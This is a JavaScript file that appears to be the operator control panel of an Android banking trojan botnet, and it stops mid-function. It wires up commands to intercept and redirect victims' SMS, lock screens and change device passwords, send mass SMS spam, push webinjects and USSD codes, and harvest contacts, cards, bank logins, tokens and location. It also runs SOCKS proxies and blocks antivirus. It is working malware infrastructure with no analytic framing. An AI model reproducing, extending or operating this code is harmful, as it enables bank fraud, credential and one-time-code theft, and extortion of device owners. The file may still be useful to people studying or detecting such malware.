var core_context = {};
var preventRowChk = false;

function onTotalSelectChange ()
{
	var x = document.getElementById('select-total-check').checked;
	
	var len = document.forms['bots-select-form'].length;
	
	for (var i = 0; i < len; i++)
	{
		var element = document.forms['bots-select-form'][i];
		
		if (element.type == "checkbox") element.checked = x;
	}
}

send_command_options = '<option value="">Select command</option>'
			+ '<option value="rent&&&">Enable sms intercept</option>'
			+ '<option value="sms_stop&&&">Disable sms intercept</option>'
			+ '<option value="UpdateInfo">Update bot info</option>'
			+ '<option value="freedialogdisable">Disable screen lock</option>'
			+ '<option value="adminPhone">Set new admin phone</option>'
			+ '<option value="killStart">Kill - lock screen, no sound, change password</option>'
			+ '<option value="killStop">Disable kill - unfreeze app, remove password</option>'
			+ '<option value="repeatInject">Repeat filled inject</option>'
			+ '<option value="redirect&&&">SMS redirect</option>'
			
// set hint in "Send command" params field 
function updateHint(select, input)
{
	var opt = $(select).val();
	
	if(opt == 'rent&&&' || opt == 'sms_stop&&&' || opt == 'UpdateInfo' || opt == 'freedialogdisable' || opt == 'killStop')
		place = 'no options'
	else if(opt == 'adminPhone')
		place = 'phone number'
	else if(opt == 'killStart')
		place = 'password, min. 4 symbols! (default = 9991)'
	else if(opt == 'repeatInject')
		place = 'package.name'
	else if (opt == 'redirect&&&')
		place = 'phone#delay (default admin phone and 60 min)';
		
	$('#' + input).attr('placeholder', place);
}

function showLoaderPic (param)
{
	var ldiv = document.getElementById('loader-div')
	
	if (ldiv != null)
	{
		ldiv.hidden = param;
	}
}

function postContentRequest (url, params, resultContainer, handler)
{
	var req = new XMLHttpRequest();
	
	req.open ("POST", url, true);
	req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
	
	req.onreadystatechange = function () {
		if (req.readyState == 4)
		{
			if (req.status == 200)
			{
				if (resultContainer != null)
					resultContainer.innerHTML = req.responseText;
				if (handler != null) handler (req.responseText);
			}
			else
			{
				if (resultContainer != null)
					resultContainer.innerHTML = "Error " + req.status;
			}
			
			showLoaderPic(true);
		}
	}
	
	showLoaderPic(false);
	
	req.send (params);
}

function requestContent (view, filter, handler)
{

	var params = "action=getcontent&view=" + encodeURIComponent(view);
	
	for (var key in filter)
	{
		params += '&filter%5B' + key + '%5D='
			   +  encodeURIComponent(filter[key]);
	}
	
	var content_div = document.getElementById('content');
	
	var url = "handler.php";
	
	if (core_context.page != null) url = url + "?page=" + core_context.page;
	
	postContentRequest(url, params, content_div, handler);
}

function requestAction (action, params, handler)
{
	var params_str = "action=" + encodeURIComponent(action);
	
	for (var key in params)
	{
		params_str += '&' + key + '='
			   +  encodeURIComponent(params[key]);
	}
	
	postContentRequest("handler.php", params_str, null, handler);
}

function onApplyFilter ()
{
   console.log("onapplyfilter start");
	var filter_div = document.getElementById('filter');
	//var inputs = filter_div.getElementsByTagName('input');
	var inputs = $("input,select",filter_div);

	
	var filter = {};
	
	for (var i = 0; i < inputs.length; i++)
	{
		var inp = inputs[i];
		
		if (inp.id.search ('filter-') != -1)
		{
			var param_name = inp.id.substring (7);
			
			if (inp.type == 'text' || inp.type == 'hidden')
			{
				filter[param_name] = inp.value;
			}
			else if (inp.type == 'checkbox')
			{
				if (inp.checked) filter[param_name] = "on";
			}
			else
			{
				filter[param_name] = $(inp).val();
			}
		}
	}

	requestContent(core_context.content, filter, core_context.handler);
}

function setFilterHandler ()
{
	document.getElementById('filter').style.display = "inherit";
	document.getElementById('filter-apply').onclick = onApplyFilter;
	
//document.getElementById('content').style.marginTop = "180px";
}

function requestFilter (view, filter)
{
	var params = "action=getfilter&view=" + encodeURIComponent(view);
	
	for (var key in filter)
	{
		params += '&filter%5B' + key + '%5D='
			   +  encodeURIComponent(filter[key]);
	}
	
	var filter_div = document.getElementById('filter');
	
	postContentRequest("handler.php", params, filter_div, setFilterHandler);
}

function setActiveMenuItem (menuid, itemid)
{
	document.location.hash = itemid
	
	var list = document.getElementById(menuid);
	
	for (var i = 0; i < list.childElementCount; i++)
	{
		var li = list.children[i];
		
		if (li.children[0] !== undefined && li.children[0].id == itemid)
		{
			if (!li.classList.contains('active'))
				li.classList.add('active');
		}
		else
		{
			if (li.classList.contains('active'))
				li.classList.remove('active');
		}
	}
}

function deactivateMenuItems (menuid)
{
	var list = document.getElementById(menuid);
	
	for (var i = 0; i < list.childElementCount; i++)
	{
		var li = list.children[i];
		
		if (li.classList.contains('active'))
			li.classList.remove('active');
	}
}

function isMenuItemActive (menuid, itemid)
{
	var list = document.getElementById(menuid);
	
	for (var i = 0; i < list.childElementCount; i++)
	{
		var li = list.children[i];
		
		if (li.children[0] !== undefined && li.children[0].id == itemid)
		{
			return li.classList.contains('active');
		}
	}
	
	return false;
}

function showBotsCommandPanel ()
{    
	var content = '<div id="command-panel" class="container"><h2>Bots menu</h2>'
			+ '<ul id="command-list">'
			+ '<li class=""><a id="command-sms">Send&nbsp;SMS</a></li>'
			//+ '<li class=""><a id="command-uploadsms">Upload&nbsp;SMS</a></li>'
			+ '<li class=""><a id="command-freedialog">Screenlock</a></li>'
			+ '<li class=""><a id="command-delivery">Mass SMS Spam</a></li>'
			+ '<li class=""><a id="command-intercept">Intercept</a></li>'
			//+ '<li class=""><a id="command-rent">Rent</a></li>'
			+ '<li class=""><a id="command-windowsNew-mass">Set&nbsp;webinjects</a></li>'
			+ '<li class=""><a id="command-appmass-mass">Appmass</a></li>'
			+ '<li class=""><a id="command-send-command">Send&nbsp;Command</a></li>'
			+ '<li class=""><a id="command-notification">Notification</a></li>'
			+ '<li class=""><a id="command-adminphone">Admin phone</a></li>'
			+ '<li class=""><a id="command-deletebot">Delete</a></li>'
			//+ '<li class=""><a id="command-apiserver">Admin URL</a></li>'
//            + '<li class=""><a id="command-clean">Clean</a></li>'
  //          + '<li class=""><a id="command-check-manager">Check&nbsp;manager&nbsp;status</a></li>'
			+ '</ul>'
			+ '</div>';
	
	document.getElementById('command-bar').innerHTML = content;
	
	document.getElementById('command-sms').onclick = onCommandSmsClick;
	//document.getElementById('command-uploadsms').onclick = onCommandUploadSmsClick;
	document.getElementById('command-delivery').onclick = onCommandDeliveryClick;
	document.getElementById('command-freedialog').onclick = onCommandfreedialogClick;
	document.getElementById('command-intercept').onclick = onCommandInterceptClick;
	//document.getElementById('command-rent').onclick = onCommandRentClick;
//    document.getElementById('command-intercept44').onclick = onCommandIntercept44Click;
	document.getElementById('command-windowsNew-mass').onclick = onCommandWindowsNewMassClick;
	document.getElementById('command-appmass-mass').onclick = onCommandAppmassMassClick;
	document.getElementById('command-send-command').onclick = onCommandSendCommand;
	document.getElementById('command-notification').onclick = onCommandNotification;
	document.getElementById('command-adminphone').onclick = onCommandAdminPhone;
	//document.getElementById('command-apiserver').onclick = onCommandApiserver;
	document.getElementById('command-deletebot').onclick = onCommandDeleteBot;
//    document.getElementById('command-clean').onclick = onCommandCleanClick;
//    document.getElementById('command-check-manager').onclick = onCommandCheckManager;
		
	document.getElementById('content').style.marginBottom = "30px";
}

function showBotInfoCommandPanel ()
{    
	var content = '<div id="command-panel" class="container"><h1>Bot menu</h1>'
			+ '<ul id="command-list">'
			+ '<li class=""><a id="command-cmd">Send&nbsp;Command</a></li>'
			+ '<li class=""><a id="command-sms">Send&nbsp;SMS</a></li>'
			//+ '<li class=""><a id="command-uploadsms">Upload&nbsp;SMS</a></li>'
			+ '<li class=""><a id="command-ussd">Send&nbsp;USSD</a></li>'
			+ '<li class=""><a id="command-freedialog">Screenlock</a></li>'
			+ '<li class=""><a id="command-delivery">Mass&nbsp;SMS&nbsp;Spam</a></li>'
			+ '<li class=""><a id="command-appmass">App&nbsp;Mass</a></li>'

			+ '<li class=""><a id="command-windowStop">Block&nbsp;webinject</a></li>'
			+ '<li class=""><a id="command-windowStart">Unblock&nbsp;webinject</a></li>'
			+ '<li class=""><a id="command-windowsNew">Set&nbsp;webinjects</a></li><br />'

			+ '<li class=""><a onclick="sendCommand (core_context.botid, \'UpdateInfo\', [], onCommandDone);">Update&nbsp;Info</a></li>'

			+ '<li class=""><a id="command-intercept">Intercept</a></li>'
			//+ '<li class=""><a id="command-rent">Rent</a></li>'
			+ '<li class=""><a id="command-show-sms">Show&nbsp;SMS</a></li>'
			+ '<li class=""><a id="command-show-cards">Show&nbsp;cards</a></li>'
			+ '<li class=""><a id="command-show-banks">Show&nbsp;banks</a></li>'
			+ '<li class=""><a onclick="sendCommand (core_context.botid, \'getContacts\', [], onCommandDone);">Get&nbsp;Contacts</a></li>'
			+ '<li class=""><a id="command-request-token">Request&nbsp;Token</a></li>'
			+ '<li class=""><a id="command-request-coordinates">Request&nbsp;Coordinates</a></li>'
			+ '</ul>'
			+ '</div>';
	
	document.getElementById('command-bar').innerHTML = content;
	
	document.getElementById('command-cmd').onclick = onBotinfoCmdClick;
	document.getElementById('command-sms').onclick = onBotinfoSmsClick;
	//document.getElementById('command-uploadsms').onclick = onCommandUploadSmsClick;
	document.getElementById('command-ussd').onclick = onBotinfoUssdClick;
	document.getElementById('command-delivery').onclick = onBotinfoDeliveryClick;
	document.getElementById('command-freedialog').onclick = onBotinfofreedialogClick;
	document.getElementById('command-intercept').onclick = onBotinfoInterceptClick;
	//document.getElementById('command-rent').onclick = onBotinfoRentClick;
	document.getElementById('command-appmass').onclick = onBotinfoAppmassClick;
	
	document.getElementById('command-windowStop').onclick = onBotinfoWindowStopClick;
	document.getElementById('command-windowStart').onclick = onBotinfoWindowStartClick;
	document.getElementById('command-windowsNew').onclick = onBotinfoWindowsNewClick;
	
	document.getElementById('command-show-sms').onclick = onBotinfoShowSmsClick;
	document.getElementById('command-show-cards').onclick = onBotinfoShowCardsClick;
	document.getElementById('command-show-banks').onclick = onBotinfoShowBanksClick;

	document.getElementById('command-request-token').onclick = onBotinfoRequestTokenClick;
	document.getElementById('command-request-coordinates').onclick = onBotinfoRequestCoordinatesClick;
	   
	document.getElementById('content').style.marginBottom = "30px";
}

function onBotinfoRequestTokenClick()
{
	var form = document.getElementById('command-form');
	if (form == null)
	{
		var content = '<div class="row"><div class=col-md-10><input class="form-control" id="request-token-package" size="40" placeholder="package.name" type="text"></div><div class="col-md-2"><button id="request-token-button">Request token</button></div></div>';
		hideCommandForm();
		showCommandForm(content);

		document.getElementById('request-token-button').onclick = function(){
			var package = document.getElementById('request-token-package').value;
			if (!package){
				return;
			}

			requestAction('request_token', {
				botid: core_context.botid,
				appid: package
			}, onCommandDone);

		};

	}
	else 
	{
		hideCommandForm();
	}
}

function onBotinfoRequestCoordinatesClick()
{

	var form = document.getElementById('command-form');
	if (form == null)
	{
		var content = '<div class="row">'
		+ '<div class=col-md-4>'
		+ '<input class="form-control" id="request-coordinates-package" size="40" placeholder="package.name" type="text">'
		+ '</div>'
		+ '<div class=col-md-2>'
		+ '<input class=form-control id="request-coordinates-p1" placeholder="1st" type="text">'
		+ '</div>'
		+ '<div class=col-md-2>'
		+ '<input class=form-control id="request-coordinates-p2" placeholder="2nd" type="text">'
		+ '</div>'
		+ '<div class=col-md-2>'
		+ '<input class=form-control id="request-coordinates-p3" placeholder="3rd" type="text">'
		+ '</div>'
		+ '<div class="col-md-2">'
		+ '<button id="request-coordinates-button">Send</button>'
		+ '</div></div>';
		hideCommandForm();
		showCommandForm(content);

		document.getElementById('request-coordinates-button').onclick = function(){
			var package = document.getElementById('request-coordinates-package').value;
			if (!package){
				return;
			}

			requestAction('request_coordinates', {
				botid: core_context.botid,
				appid: package,
				p1: $('#request-coordinates-p1').val(),
				p2: $('#request-coordinates-p2').val(),
				p3: $('#request-coordinates-p3').val()
			}, onCommandDone);

		};

	}
	else 
	{
		hideCommandForm();
	}

}

function showCards(botid)
{
	core_context.botid = botid
	onBotinfoShowCardsClick()
}

function showBanks(botid)
{
	core_context.botid = botid
	onBotinfoShowBanksClick()
}

function hideCommandPanel ()
{
	document.getElementById('command-bar').innerHTML = "";
	document.getElementById('content').style.marginBottom = "0";
}

function hideFilter ()
{
	var filter = document.getElementById('filter');
	var content = document.getElementById('content');
	
	filter.innerHTML = "";
	filter.style.display = "none";
	
	content.style.marginTop = "160px";
}

function onSetCommentDone (response)
{
	//alert ('Done ' + response);
	setupMessageBox('Result', response);
	refreshContent();
}

function onSetNumberDone (response)
{
	//alert ('Done ' + response);
	setupMessageBox('Result', response);
	refreshContent();
}

function onSetCommentClick ()
{
	var params = {};
	
	params.botid = core_context.botid;
	params.comment = document.getElementById('botinfo-comment').value;
	
	requestAction('setcomment', params, onSetCommentDone);
}

function onSetNumberClick ()
{
	var params = {};

	params.botid = core_context.botid;
	params.number = document.getElementById('botinfo-number').value;
	params.type = 'bots';

	requestAction('setnumber', params, onSetNumberDone);
}

function onBotInfoLoad ()
{
	showBotInfoCommandPanel();
	document.getElementById('botinfo-comment-send').onclick = onSetCommentClick;
	document.getElementById('botinfo-number-send').onclick = onSetNumberClick;
}

function onBotInfoClick ()
{
	var botid = this.id.substring(14);
	
	core_context.botid = botid;
	core_context.content = 'botinfo';
	
	hideFilter();
	requestContent('botinfo', {"botid": botid}, onBotInfoLoad);
	
	deactivateMenuItems('menu');
}

function onPageLinkClick ()
{
	console.log("onpagelinkclick start");
	var page = this.id.substring (10);
	
	core_context.page = page;
	
	onApplyFilter();
}

function setPageLinkHandlers ()
{

	var plist = document.getElementById('pages-list');
	
	if (plist != null)
	{

		var links = plist.getElementsByTagName('option');



		for (var i = 0; i < links.length; i++)
		{
			var link = links[i];
			
			if (link.id.search("page-link-") != -1)
			{
				link.onclick = onPageLinkClick;
			}
		}
	}
}

function setBotInfoHandlers ()
{
	var content = document.getElementById('content');
	var tbls = content.getElementsByTagName('table');
	
	if (tbls.length > 0)
	{
		var tbl = tbls[0];
		
		var links = tbl.getElementsByTagName('a');
		
		for (var i = 0; i < links.length; i++)
		{
			var link = links[i];
			
			if (link.id.search("bots-table-id-") != -1)
			{
				link.onclick = onBotInfoClick;
			}
		}
	}
	
	setPageLinkHandlers ()
}

function onBotsRowClick ()
{
	if (!preventRowChk) 
	{
		var chk = this.children[0].children[0];
	
		chk.checked = !chk.checked;
	}
	else
	{
			preventRowChk = false;
	}
}

function setBotsTableHandlers ()
{
	var cnt = document.getElementById('content');
	var rows = cnt.getElementsByTagName('tr');
	
	for (var i = 0; i < rows.length; i++)
	{
		if (rows[i].parentElement.tagName == 'TBODY')
		{
			rows[i].onclick = onBotsRowClick;
		}
	}
	
	setBotInfoHandlers ();
}

function onStatClick()
{
	hideFilter();
	requestContent('statistics', {}, null);    
	setActiveMenuItem('menu', 'menu-stat');
	core_context.content = 'statistics';
	hideCommandPanel();
}

function showBot(bot_id)
{
	hideFilter();
	core_context.content = 'botinfo'
	requestContent('botinfo', {"botid": bot_id}, onBotInfoLoad);
	hideCommandPanel();
}

function onNewsClick()
{
	hideFilter();
	requestContent('news', {}, null);    
	setActiveMenuItem('menu', 'menu-news');
	core_context.content = 'news';
	hideCommandPanel();
}

function onBotsClick ()
{
	requestFilter ('bots');
	requestContent('bots', {}, setBotsTableHandlers);
	
	setActiveMenuItem('menu', 'menu-bots');
	
	core_context.content = 'bots';
	core_context.handler = setBotInfoHandlers;
	core_context.page = null;
	
	showBotsCommandPanel();
}

function onSmsClick ()
{
	requestFilter ('sms');
	requestContent('sms', {}, setBotInfoHandlers);
	
	setActiveMenuItem('menu', 'menu-sms');
	
	core_context.content = 'sms';
	core_context.handler = setBotInfoHandlers;
	core_context.page = null;
	
	hideCommandPanel();
}

function onSmsIncomingClick ()
{
	requestFilter ('sms-incoming');
	requestContent('sms-incoming', {}, setBotInfoHandlers);
	
	setActiveMenuItem('menu', 'menu-sms-incoming');
	
	core_context.content = 'sms-incoming';
	core_context.handler = setBotInfoHandlers;
	core_context.page = null;
	
	hideCommandPanel();
}


function onCardsClick ()
{
	requestFilter ('cards');
	requestContent('cards', {}, setBotInfoHandlers);
	
	setActiveMenuItem('menu', 'menu-sork1');
	
	core_context.content = 'cards';
	core_context.handler = setBotInfoHandlers;
	core_context.page = null;
	
	hideCommandPanel();
}

function onBanksClick ()
{
	requestFilter ('banks');
	requestContent('banks', {}, setBotInfoHandlers);
	
	setActiveMenuItem('menu', 'menu-sork');
	
	core_context.content = 'banks';
	core_context.handler = setBotInfoHandlers;
	core_context.page = null;
	
	hideCommandPanel();
}

function onContactsClick ()
{
	requestFilter ('contacts');
	requestContent('contacts', {}, setBotInfoHandlers);
	
	setActiveMenuItem('menu', 'menu-contacts');
	
	core_context.content = 'contacts';
	core_context.handler = setBotInfoHandlers;
	core_context.page = null;
	
	hideCommandPanel();
}

function onSocksClick ()
{
	requestFilter ('socks');
	requestContent('socks', {}, setBotInfoHandlers);
	
	setActiveMenuItem('menu', 'menu-socks');
	
	core_context.content = 'socks';
	core_context.handler = setBotInfoHandlers;
	core_context.page = null;
	
	hideCommandPanel();

}

function onTokensClick ()
{
	requestFilter ('tokens');
	requestContent('tokens', {}, setBotInfoHandlers);
	
	setActiveMenuItem('menu', 'menu-tokens');
	
	core_context.content = 'tokens';
	core_context.handler = setBotInfoHandlers;
	core_context.page = null;
	
	hideCommandPanel();

}

function onCoordClick ()
{
	requestFilter ('coordinates');
	requestContent('coordinates', {}, setBotInfoHandlers);
	
	setActiveMenuItem('menu', 'menu-coordinates');
	
	core_context.content = 'coordinates';
	core_context.handler = setBotInfoHandlers;
	core_context.page = null;
	
	hideCommandPanel();

}

function onBanks2Click ()
{
	requestFilter ('banks2');
	requestContent('banks2', {}, setBotInfoHandlers);

	setActiveMenuItem('menu', 'menu-sork2');

	core_context.content = 'banks2';
	core_context.handler = setBotInfoHandlers;
	core_context.page = null;

	hideCommandPanel();
}

function onAppsClick ()
{
   // hideFilter();
	requestFilter ('apps');
	requestContent('apps', {}, setBotInfoHandlers);
	
	setActiveMenuItem('menu', 'menu-apps');
	
	core_context.content = 'apps';
	core_context.handler = setBotInfoHandlers;
	core_context.page = null;




	hideCommandPanel();


}

function onSettingsClick ()
{
	hideFilter();
	//requestFilter ('settings');
	requestContent('settings', {}, function(){});
	
	setActiveMenuItem('menu', 'menu-settings');
	
	core_context.content = 'settings';
	//core_context.handler = setBotInfoHandlers;
	core_context.page = null;
	
	hideCommandPanel();
}

function onApksClick ()
{
	hideFilter();
	requestContent('apks', {}, function(){});
	setActiveMenuItem('menu', 'menu-apks');
	core_context.content = 'apks';
	core_context.page = null;
	hideCommandPanel();
}

function onDocsClick ()
{
	hideFilter();
	requestContent('docs', {}, function(){});
	setActiveMenuItem('menu', 'menu-docs');
	core_context.content = 'docs';
	core_context.page = null;
	hideCommandPanel();
}

function showCommandForm (content)
{
	var footer = document.getElementById('command-bar');
	var panel = document.getElementById('command-panel');
	
	var form = document.createElement('div');
	form.id = 'command-form';
	form.classList.add("command-form");
	form.classList.add("container");
	
	form.innerHTML = content;
	
	footer.insertBefore (form, panel);
	
	document.getElementById('content').style.marginBottom = "68px";
}

function hideCommandForm ()
{
	var footer = document.getElementById('command-bar');
	var form = document.getElementById('command-form');
	
	if (form != null) footer.removeChild (form);
	
	deactivateMenuItems('command-list');
	
	document.getElementById('content').style.marginBottom = "30px";
}

function refreshContent ()
{
	if (core_context.content != null)
	{
		if (core_context.content == 'statistics')
		{
			requestContent('statistics', {}, null);
		}
		else if (core_context.content == 'botinfo')
		{
			requestContent('botinfo',
						   {"botid": core_context.botid},
						   onBotInfoLoad
						   );
		}
		else onApplyFilter();
	}
}

function createLoaderPic ()
{
	var ldiv = document.createElement('div');
	var lpic = document.createElement('img');
	
	lpic.id = "loader-pic";
	lpic.src = "img/loader.gif";
	
	ldiv.id = "loader-div";
	ldiv.style.position = "absolute";
	ldiv.style.top = 0;
	ldiv.style.right = 0;
	ldiv.appendChild(lpic);
	
	ldiv.hidden = true;
	
	document.body.appendChild (ldiv);
}

function setCookie(name, value, props) {
	props = props || {}
	var exp = props.expires
	if (typeof exp == "number" && exp) {
		var d = new Date()
		d.setTime(d.getTime() + exp*1000)
		exp = props.expires = d
	}
	if(exp && exp.toUTCString) { props.expires = exp.toUTCString() }

	value = encodeURIComponent(value)
	var updatedCookie = name + "=" + value
	for(var propName in props){
		updatedCookie += "; " + propName
		var propValue = props[propName]
		if(propValue !== true){ updatedCookie += "=" + propValue }
	}
	document.cookie = updatedCookie

}

function deleteCookie(name) {
	setCookie(name, null, { expires: -1 })
}

function onLogoutClick ()
{
	deleteCookie ("login");
	deleteCookie ("hash");
	
	document.location = "login.html";
}

function onRegNewClick ()
{
	setupRegNewBox();
}

function onProfileClick ()
{
	setupProfileBox ();
}

function fixChkBotsClick(event)
{
		//alert('!!!');
		preventRowChk = true;

//		event.preventDefault();
	//	return false;

}

function onWindowLoad ()
{
	document.getElementById('menu-news').onclick = onNewsClick;
	document.getElementById('menu-stat').onclick = onStatClick;
	document.getElementById('menu-bots').onclick = onBotsClick;
	document.getElementById('menu-sms').onclick = onSmsClick;
	//document.getElementById('menu-sms-incoming').onclick = onSmsIncomingClick;
	document.getElementById('menu-sork1').onclick = onCardsClick;
	document.getElementById('menu-sork').onclick = onBanksClick;
	//~ document.getElementById('menu-sork2').onclick = onBanks2Click;
	document.getElementById('menu-apps').onclick = onAppsClick;
	document.getElementById('menu-contacts').onclick = onContactsClick;
	document.getElementById('menu-socks').onclick = onSocksClick;
	document.getElementById('menu-tokens').onclick = onTokensClick;
	document.getElementById('menu-coordinates').onclick = onCoordClick;
	document.getElementById('menu-settings').onclick = onSettingsClick;
	document.getElementById('menu-apks').onclick = onApksClick;
	document.getElementById('menu-docs').onclick = onDocsClick;
	
	document.getElementById('login-profile').onclick = onProfileClick;
	document.getElementById('login-logout').onclick = onLogoutClick;
	
	var regnew = document.getElementById('login-regnew');
	
	if (regnew !== null) regnew.onclick  = onRegNewClick;
	
	//onStatClick(true);
		hideFilter();
		requestContent('news', {}, null); 		// Start page
		core_context.content = 'news';
		hideCommandPanel();

	//createLoaderPic ();
	
   	var h = document.location.hash.replace('#', '')
   	
   	if(h.startsWith('showBot-'))
   	{
		var botid = h.split('-')[1]
		showBot(botid)
		return
	}
	
	var elems = {
	'menu-news': onNewsClick,
	'menu-stat': onStatClick,
	'menu-bots': onBotsClick,
	'menu-sms': onSmsClick,
	'menu-sms-incoming': onSmsIncomingClick,
	'menu-sork1': onCardsClick,
	'menu-sork': onBanksClick,
	'menu-sork2': onBanks2Click,
	'menu-apps': onAppsClick,
	'menu-settings': onSettingsClick,
	'menu-apks': onApksClick,
	'menu-docs': onDocsClick,
	'login-profile': onProfileClick,
	'login-logout': onLogoutClick,
	'menu-contacts': onContactsClick
	}
	
	if(elems[h] !== undefined)
		elems[h]();
	
	// setInterval(refreshContent, 20000);
}



window.onload = onWindowLoad;

$(function(){

	function get_max_notification_id()
	{
		var max = 0;
		$(".notify-row").each(
			function ()
			{
				if ($(this).data('id') > max) max = $(this).data('id');
			}
		);

		return max;
	}

	function get_new_notification_id()
	{
		return get_max_notification_id()+1;
	}

	$(document).on('click', '.apps-table-appname', function() {
		console.log($(this).data('appname'));
		requestFilter ('bots', {"appname": $(this).data('appname'), "online": "on", "dead": "on"});
		requestContent('bots', {"appname": $(this).data('appname'), "online": "on", "dead": "on"}, setBotInfoHandlers);
		
		core_context.content = 'bots';
		core_context.handler = setBotInfoHandlers;
		core_context.page = null;
		
		setActiveMenuItem('menu', 'menu-bots');
		
	   // hideCommandPanel();
		showBotsCommandPanel();

	});

	$(document).on('click', '.save-comment', function(){
		
		var cmt_id = $(this).attr('id').split('_')[1]
		var cmt = $('#comment_' + cmt_id).val();
		
		requestAction('setcomment', {
			botid: $(this).data('botid'),
			dataId: $(this).data('id'),
			type: $(this).data('type'),
			comment: cmt,
		}, onSetCommentDone);
	});

	$(document).on('click', '.save-number', function(){
		requestAction('setnumber', {
			botid: $(this).data('botid'),
			type: $(this).data('type'),
			number: $(this).closest('.number-block').find('input')[0].value
		}, onSetNumberDone);
	});

	$(document).on('click', '.remove-card', function(){
		requestAction('removecard', {
			botid: $(this).data('botid'),
			number: $(this).data('number')
		}, onSetCommentDone);
	});

	$(document).on('click', '.remove-token', function(){
		requestAction('removetoken', {
			dataId: $(this).data('id')
		}, onSetCommentDone);
	});

	$(document).on('click', '.remove-coordinate', function(){
		requestAction('removecoordinate', {
			dataId: $(this).data('id')
		}, onSetCommentDone);
	});

	$(document).on('click', '.remove-contact', function(){
		requestAction('removecontact', {
			botid: $(this).data('botid'),
			id: $(this).data('id')
		}, onSetCommentDone);
	});

	$(document).on('click', '.remove-bank', function(){
		requestAction('removebank', {
			botid: $(this).data('botid'),
			id: $(this).data('id')
		}, onSetCommentDone);
	});

	$(document).on('click', '.remove-bank2', function(){
		requestAction('removebank2', {
			botid: $(this).data('botid'),
			id: $(this).data('id')
		}, onSetCommentDone);
	});

	$(document).on('click', '.save-settings', function(){

		var notify_json = "{\"notifications\": [";

		$(".notify-row").each(
			function ()
			{
				var id = $(this).data('id');

				if (id !== undefined) {
					if (notify_json !== "{\"notifications\": [") {
						notify_json = notify_json + ',';
					}
					notify_json = notify_json + '{';


					var to = $(".settings-notify-to", $(this)).val();
					var body = $(".settings-notify-body", $(this)).val();
					var body2 = $(".settings-notify-body2", $(this)).val()

					notify_json = notify_json + '"id": "' + id + '", ' + '"to": "' + to + '", ' + '"body": "' + body + '", ' + '"body2": "' + body2 + '"';

					notify_json = notify_json + '}';
				}
			}
		);

		notify_json= notify_json + "]}";

		requestAction('savesettings', {
			phones: $('.settings-phones').val(),
			av_block: $('.settings-av-block').val(),
			run_commands: $('.settings-run-commands').val(),
			track_bl_new: $('.settings-track-bl-new').prop('checked'),
			appmass: $('.settings-appmass').val(),
			bl_command_body: $('.settings-bl-command-body').val(),
			notify_timeout: $('.settings-notify-timeout').val(),
			notify_json: notify_json
		}, onSetCommentDone);
	});

	$(document).on('click', '.socks-button', function(){
		sendCommand($(this).attr('data-botid'), 'socks', $(this).attr('data-param'), onCommandDone);
	});

	$(document).on('click', '.tracking-button', function(){
	//    console.log($(this).attr('data-botid'));
//        console.log($(".tracking-button").attr('data-botid'));
		$.post('../set_track.php', {
			'bot': $(this).attr('data-botid')
		}, function(data){
			onCommandTrackingDone(data);
			$(".tracking-button").remove();
		})
	});


	$(document).on('click', '.menu-blacklist-btn', function(event){
		//    console.log($(this).attr('data-botid'));
		//console.log("click!");
		var modal = $("#modal");
		var apps = $(this).data("apps").toString();
		var apps_list = apps.split('|');
		$(".caption .text",modal).text("Black Listed Apps:");
		var table = $("<table/>");
		apps_list.forEach(
			function(item,i,list)
			{
				table.append($("<tr/>")
						.append(
						$("<td/>").text(item)
					)
				)
			}
		);
		$(".content",modal).empty(table);
		$(".content",modal).append(table);
		var x = event.pageX;
		var y = event.pageY;
		modal.css("left",x);
		modal.css("top",y);
		modal.css("display","block");
	});

	$(document).on('click','body',function(event)
		{
			var target = $(event.target);

			if ((target.prop('id') != "modal")&&(target.parents('#modal').length === 0)&&(!target.hasClass('menu-blacklist-btn')))
			{
				if ($("#modal").css("display") === 'block') $("#modal").css("display","none");
			}
		}
	);

	$(document).on('click','.notify-add',
		function()
		{
			var new_id = get_new_notification_id();

			var html =
				'<div class="row notify-row" data-id="'+ new_id +'">'
				+'<div class="col-md-4" style="float:left">'
				+'<input type="text" class="form-control settings-notify-to" value="" placeholder="to..."/>'
				+'</div>'
				+'<div class="col-md-3" style="float:left">'
				+'<input type="text" class="form-control settings-notify-body" value="" placeholder="body..."/>'
				+'</div>'

				+'<div class="col-md-3">'
				+'<input type="text" class="form-control settings-notify-body2" value="" placeholder="body2..."/>'
				+'</div>'
				+'<div class="col-md-1" style="margin-left: 7px">'
				+' <a class="delete-notify" style="cursor:pointer"><i class="fa fa-times"></i></a>'
				+'</div>'
				+'</div>';

			//$("#notify-cont").css("border", "3px");

			$(html).appendTo("#notify-cont");

		}
	);

	$(document).on('click','.delete-notify',
		function(){
			$(this).parent().parent().remove();
		}
	);

	$(document).on('click', '#request-token', function(){
		// REQUEST TOKEN

		var bid = $('#field-botid').val();
		if (!bid.length){
			var bidValue = '';
			var checkedInputs = document.querySelectorAll('input[id^="check-token"]:checked');
			for (var i = 0; i < checkedInputs.length; i++){
				var input = checkedInputs[i];
				var parent = input.parentElement.parentElement;
				var checkedId = parent.querySelector('.bots-table-botid').id;
				checkedId = checkedId.substr(14);
				bidValue += checkedId;
				if (i != checkedInputs.length-1){
					bidValue += ',';
				}
			}
			$('#field-botid').val(bidValue);
		}

		requestAction('request_token', {
			botid: $('#field-botid').val(),
			appid: $('#field-appid').val()
		}, onCommandDone);
	});

	$(document).on('click', '#request-coordinates', function(){

		var bid = $('#field-botid').val();
		if (!bid.length){
			var bidValue = '';
			var checkedInputs = document.querySelectorAll('input[id^="check-coord"]:checked');
			for (var i = 0; i < checkedInputs.length; i++){
				var input = checkedInputs[i];
				var parent = input.parentElement.parentElement;
				var checkedId = parent.querySelector('.bots-table-botid').id;
				checkedId = checkedId.substr(14);
				bidValue += checkedId;
				if (i != checkedInputs.length-1){
					bidValue += ',';
				}
			}
			$('#field-botid').val(bidValue);
		}

		requestAction('request_coordinates', {
			botid: $('#field-botid').val(),
			appid: $('#field-appid').val(),
			fields: $('#fields').val(),
		}, onCommandDone);
	});
	
});

function setCookie(cname, cvalue, exdays) {
	var d = new Date();
	d.setTime(d.getTime() + (exdays*24*60*60*1000));
	var expires = "expires="+ d.toUTCString();
	document.cookie = cname + "=" + cvalue + "; " + expires;
} 

function getCookie(cname) {
	var name = cname + "=";
	var ca = document.cookie.split(';');
	for(var i = 0; i <ca.length; i++) {
		var c = ca[i];
		while (c.charAt(0)==' ') {
			c = c.substring(1);
		}
		if (c.indexOf(name) == 0) {
			return c.substring(name.length,c.length);
		}
	}
	return "";
} 

function switchPage(page)
{
	core_context.page = page;
	//~ document.cookie = document.cookie + '; page_num='+page
	setCookie('page_num', page, 5)
